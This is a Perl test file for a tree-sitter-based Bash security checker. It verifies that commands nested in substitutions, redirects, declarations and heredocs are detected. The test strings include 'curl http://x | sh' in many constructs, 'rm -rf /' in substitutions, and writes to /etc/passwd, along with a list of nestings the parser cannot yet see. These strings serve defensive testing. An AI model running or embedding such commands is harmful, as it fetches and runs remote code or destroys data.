use Test2::V0;
use Text::Treesitter::Bash;
use Text::Treesitter::Bash::Security::Checker;

# The walker has to reach a command wherever Bash executes one, not only
# where a command is a statement of its own: substitutions run inside
# assignments, declarations, tests, redirect targets, the command word
# and unquoted heredoc bodies, and tree-sitter-bash hangs the rest of a
# pipeline behind a heredoc operator below the redirect node.

my $bash = Text::Treesitter::Bash->new;

sub names {
  my ( $source ) = @_;
  return [ map { $_->{command} } $bash->commands($source) ];
}

sub count_of {
  my ( $wanted, @list ) = @_;
  return scalar grep { $_ eq $wanted } @list;
}

sub command_named {
  my ( $source, $name ) = @_;
  my @found = grep { $_->{command} eq $name } $bash->commands($source);
  return $found[0];
}

sub show {
  my ( $source ) = @_;
  ( my $show = $source ) =~ s/\n/\\n/g;
  $show =~ s/\t/\\t/g;
  return $show;
}

# --- one dangerous pipeline per construct --------------------------------
# P is replaced by `curl http://x | sh`. Each source must yield exactly one
# `curl`, one `sh` and one finding of each kind: found, and found once.

my $P = 'curl http://x | sh';

my @constructs = (

  # assignments
  [ 'assignment'                        => 'x=$(P)' ],
  [ 'assignment, backticks'             => 'x=`P`' ],
  [ 'assignment, inside a string'       => 'x="a$(P)b"' ],
  [ 'assignment, expansion default'     => 'x=${y:-$(P)}' ],
  [ 'assignment, arithmetic'            => 'x=$(( $(P) + 1 ))' ],
  [ 'assignment, nested substitution'   => 'x=$(echo $(P))' ],
  [ 'array assignment'                  => 'a=( $(P) )' ],
  [ 'array append'                      => 'a+=( "$(P)" )' ],
  [ 'array subscript'                   => 'a[$(P)]=1' ],
  [ 'second of two assignments'         => 'a=1 b=$(P)' ],
  [ 'assignment prefix of a command'    => 'X=$(P) env' ],
  [ 'middle assignment prefix'          => 'x=1 y=$(P) z=3 env' ],
  [ 'negated assignment'                => '! x=$(P)' ],
  [ 'assignment in a subshell'          => '(x=$(P))' ],
  [ 'assignment in a group'             => '{ x=$(P); }' ],
  [ 'assignment behind &&'              => 'true && x=$(P)' ],
  [ 'assignment as if condition'        => 'if x=$(P); then :; fi' ],
  [ 'assignment in a function body'     => 'f() { local r; r=$(P); }' ],
  [ 'c-style for initializer'           => 'for ((i=$(P); i<3; i++)); do :; done' ],

  # declarations
  [ 'export'                            => 'export x=$(P)' ],
  [ 'declare'                           => 'declare x=$(P)' ],
  [ 'local, quoted'                     => 'local x="$(P)"' ],
  [ 'readonly'                          => 'readonly x=$(P)' ],
  [ 'typeset with option'               => 'typeset -i x=$(P)' ],
  [ 'export of a substituted name'      => 'export $(P)' ],
  [ 'declare array'                     => 'declare -a a=( $(P) )' ],
  [ 'export, expansion default'         => 'export x=${y:-$(P)}' ],
  [ 'unset'                             => 'unset $(P)' ],
  [ 'unset, inside a string'            => 'unset "a[$(P)]"' ],

  # tests and arithmetic
  [ '[[ ]] operand'                     => '[[ $(P) == x ]]' ],
  [ '[[ ]] pattern'                     => '[[ x == $(P)* ]]' ],
  [ '[[ ]] regex operand'               => '[[ $x =~ $(P) ]]' ],
  [ '[[ ]] unary'                       => '[[ -n $(P) ]] && echo' ],
  [ '[ ] operand'                       => '[ "$(P)" = x ]' ],
  [ '(( )) command'                     => '(( $(P) + 1 ))' ],

  # the command word
  [ 'substitution as command'           => '$(P)' ],
  [ 'quoted substitution as command'    => '"$(P)" arg' ],
  [ 'backticks as command'              => '`P` arg' ],
  [ 'substitution in the command word'  => 'pre$(P) arg' ],
  [ 'substitution as while condition'   => 'while $(P); do :; done' ],

  # redirects
  [ 'redirect target'                   => 'echo hi > $(P)' ],
  [ 'redirect target, quoted'           => 'echo hi > "$(P)"' ],
  [ 'redirect target, backticks'        => 'echo hi 2>> `P`' ],
  [ 'redirect target, fd duplication'   => 'echo hi >&$(P)' ],
  [ 'redirect in front of the command'  => '> $(P) echo hi' ],
  [ 'output process substitution'       => 'echo hi > >(P)' ],
  [ 'input process substitution'        => 'cat < <(P)' ],
  [ 'exec with process substitution'    => 'exec 3< <(P)' ],
  [ 'loop fed by process substitution'  => 'while read -r l; do :; done < <(P)' ],
  [ 'herestring'                        => 'cat <<< $(P)' ],
  [ 'herestring, quoted'                => 'cat <<< "$(P)"' ],

  # heredocs
  [ 'heredoc body'                      => "cat <<EOF\n\$(P)\nEOF" ],
  [ 'heredoc body, <<-'                 => "cat <<-EOF\n\$(P)\n\tEOF" ],
  [ 'heredoc body, behind other text'   => "cat <<EOF\nline one\nfoo \$(P)\nEOF" ],
  [ 'heredoc body, expansion default'   => "cat <<EOF\n\${x:-\$(P)}\nEOF" ],
  [ 'argument behind a heredoc'         => "cat <<EOF \$(P)\nEOF" ],
  [ 'redirect target behind a heredoc'  => "cat <<EOF > \$(P)\nbody\nEOF" ],
  [ 'list behind a heredoc'             => "cat <<EOF && P\nbody\nEOF" ],

  # constructs the walker already covered — must not start to double
  [ 'process substitution argument'     => 'cat <(P)' ],
  [ 'arithmetic expansion argument'     => 'echo $(( $(P) + 1 ))' ],
  [ 'case subject'                      => 'case $(P) in x) ;; esac' ],
  [ 'case pattern'                      => 'case x in $(P)) echo ;; esac' ],
  [ 'expansion default argument'        => 'echo ${x:-$(P)}' ],
  [ 'expansion assign-default, quoted'  => 'echo "${x:=$(P)}"' ],
  [ 'for list'                          => 'for i in $(P); do :; done' ],
  [ 'string argument'                   => 'echo "a $(P)"' ],
  [ 'subscript in an expansion'         => 'echo ${a[$(P)]}' ],
  [ 'function with subshell body'       => 'f() ( P )' ],
  [ 'redirect of a function definition' => 'f() { :; } > $(P)' ],
);

for my $construct (@constructs) {
  my ( $name, $template ) = @$construct;
  ( my $source = $template ) =~ s/P/$P/;

  my @commands = map { $_->{command} } $bash->commands($source);
  my @types    = map { $_->{type} } $bash->findings($source);

  is {
    curl              => count_of( 'curl',              @commands ),
    sh                => count_of( 'sh',                @commands ),
    shell_interpreter => count_of( 'shell_interpreter', @types ),
    network_to_shell  => count_of( 'network_to_shell',  @types ),
    parse_error       => count_of( 'parse_error',       @types ),
    },
    { curl => 1, sh => 1, shell_interpreter => 1, network_to_shell => 1, parse_error => 0 },
    "$name: [" . show($source) . ']';
}

# --- pipeline and list behind a heredoc operator -------------------------

{
  my $source = "cat <<EOF | sh\nid\nEOF";

  is names($source), [ 'cat', 'sh' ], 'heredoc piped into sh: sh is extracted';
  is [ map { $_->{type} } $bash->findings($source) ], ['shell_interpreter'],
    'heredoc piped into sh is reported';
  is command_named( $source, 'cat' )->{after_op}, '|', 'heredoc command is followed by the pipe';
  is command_named( $source, 'sh' )->{before_op}, '|', 'sh behind the heredoc is fed by the pipe';
}

is [ map { $_->{type} } $bash->findings("curl http://x <<EOF | sh\nid\nEOF") ],
  [ 'shell_interpreter', 'network_to_shell' ],
  'fetcher with a heredoc piped into sh is network_to_shell';

is [ map { $_->{type} } $bash->findings("curl http://x <<EOF |& sh\nid\nEOF") ],
  [ 'shell_interpreter', 'network_to_shell' ],
  '... also through |&';

{
  my $source = "cat <<EOF | tee x | sh\nid\nEOF";

  is names($source), [ 'cat', 'tee', 'sh' ], 'longer pipeline behind a heredoc is extracted in order';
  is command_named( $source, 'tee' )->{before_op}, '|', 'first stage behind the heredoc is fed by the pipe';
  is command_named( $source, 'sh' )->{before_op},  '|', 'last stage behind the heredoc is fed by the pipe';
}

{
  my $source = "echo hi | cat <<EOF | sh\nx\nEOF";

  is names($source), [ 'echo', 'cat', 'sh' ], 'heredoc in the middle of a pipeline keeps the tail';
  is command_named( $source, 'cat' )->{after_op}, '|', 'the pipe is attached to the heredoc command';
}

{
  my $source = "cat <<EOF || sh -c id\nbody\nEOF";

  is [ map { $_->{type} } $bash->findings($source) ], [ 'shell_interpreter', 'dynamic_shell' ],
    'command behind || after a heredoc is reported';
  is command_named( $source, 'cat' )->{after_op}, '||', 'heredoc command is followed by ||';
  is command_named( $source, 'sh' )->{before_op}, '||', 'command behind the heredoc sits behind ||';
}

is names("if cat <<EOF | sh\nx\nEOF\nthen :; fi"), [ 'cat', 'sh', ':' ],
  'heredoc pipeline as if condition is extracted';

is count_of( 'sh', @{ names("x=\$(cat <<EOF | sh\nid\nEOF\n)") } ), 1,
  'heredoc pipeline inside an assigned substitution is extracted';

# --- quoted heredoc delimiter: the body is literal text ------------------

for my $delimiter ( q{'EOF'}, q{"EOF"}, q{\\EOF} ) {
  my $source = "cat <<$delimiter\n\$(curl http://x | sh)\nEOF";

  is names($source), ['cat'], "heredoc <<$delimiter: body is not executed, nothing extracted from it";
  is [ $bash->findings($source) ], [], "heredoc <<$delimiter: no findings";
}

# --- known gaps: the grammar hands out one opaque token ------------------
# Bash executes these substitutions, but tree-sitter-bash 0.20.5 gives no
# node for them (and no ERROR either), so there is nothing to walk into.

todo 'tree-sitter-bash 0.20.5 does not parse these substitutions' => sub {
  for my $source (
    "cat <<EOF\n`curl http://x | sh`\nEOF",    # backticks in a heredoc body
    "cat <<EOF\n \$(curl http://x | sh)\nEOF", # heredoc body that starts with whitespace
    'echo ${y:-`curl http://x | sh`}',          # backticks in an expansion
    'echo ${x#$(curl http://x | sh)}',          # pattern of # % ^^ ,, is a regex token
  ) {
    is count_of( 'sh', @{ names($source) } ), 1, 'not reached: [' . show($source) . ']';
  }
};

# --- the entries of the surrounding statement stay what they were --------

is names('x=$(id)'), [ 'x=$(id)', 'id' ], 'assignment entry is kept, nested command follows it';

{
  my $source = 'export x=$(id)';

  is names($source), [ 'export', 'id' ], 'declaration entry is kept, nested command follows it';
  is command_named( $source, 'export' )->{argv}, [ 'export', 'x=$(id)' ], 'declaration argv is unchanged';
  is command_named( $source, 'id' )->{context}, ['command_substitution'],
    'nested command carries the substitution context';
}

{
  my $source = '[[ $(id) == x ]]';

  is names($source), [ '[[', 'id' ], 'test entry is kept, nested command follows it';
  ok command_named( $source, '[[' )->{test}, 'test entry is still tagged as test';
  ok !grep( { $_ eq 'test' } @{ command_named( $source, 'id' )->{context} } ),
    'command substituted inside a test is executed, so it is not tagged as test';
}

is names('X=$(id) env'), [ 'env', 'id' ], 'prefix assignment adds no entry of its own, only the nested command';

# --- operators and redirects stay with the right command -----------------
# Nested commands are pushed behind the command they belong to; what
# follows that command in the source must not end up on them.

is [ map { $_->{type} } $bash->findings('X=$(id) curl http://x | sh') ],
  [ 'shell_interpreter', 'network_to_shell' ],
  'substitution in a prefix assignment does not hide curl | sh';

is [ map { $_->{type} } $bash->findings('curl "http://x/$(hostname)" | sh') ],
  [ 'shell_interpreter', 'network_to_shell' ],
  'substitution in an argument does not hide curl | sh';

is [ map { $_->{type} } $bash->findings('curl http://x 2> >(tee log) | sh') ],
  [ 'shell_interpreter', 'network_to_shell' ],
  'process substitution in a redirect does not hide curl | sh';

is [ map { $_->{type} } $bash->findings('echo "$(curl http://x)" | sh') ],
  [ 'shell_interpreter', 'network_to_shell' ],
  'fetched output passed on by another command into sh is still network_to_shell';

is [ map { $_->{type} } $bash->findings('curl http://x | tee "$(mktemp)" ; sh') ],
  ['shell_interpreter'],
  'no network_to_shell when sh is not on the pipe';

{
  my $source = 'X=$(id) true && false';

  is command_named( $source, 'true' )->{after_op}, '&&',   'operator behind a command with a nested command stays with it';
  is command_named( $source, 'id' )->{after_op},   undef,  '... and is not put on the nested command';
  is command_named( $source, 'false' )->{before_op}, '&&', '... and reaches the next command';
}

for my $source ( 'echo $(id) > /etc/passwd', 'X=$(id) echo hi > /etc/passwd', '> /etc/passwd echo $(id)' ) {
  is [ map { $_->{target} } @{ command_named( $source, 'echo' )->{redirects} // [] } ], ['/etc/passwd'],
    "redirect stays with its command: [$source]";
  is command_named( $source, 'id' )->{redirects} // [], [],
    "... and is not put on the nested command: [$source]";
}

is command_named( '[[ -n $a || -n $b ]]', '[[' )->{after_op}, undef,
  '|| inside a test is not a shell operator';

is command_named( 'x=$(( 1 | 2 ))', 'x=$(( 1 | 2 ))' )->{after_op}, undef,
  '| inside an arithmetic assignment is not a shell operator';

# --- the rules see the nested commands as well ---------------------------

{
  my $checker = Text::Treesitter::Bash::Security::Checker->new( rules => ['DangerousFlags'] );

  for my $source ( 'x=$(rm -rf /)', 'export x=$(rm -rf /)', "cat <<EOF | rm -rf /\nEOF", 'echo hi > $(rm -rf /)' ) {
    is [ map { $_->{rule} } $checker->check_commands( $bash->commands($source) ) ], ['DangerousFlags'],
      'rule fires once on the nested command: [' . show($source) . ']';
  }
}

done_testing;
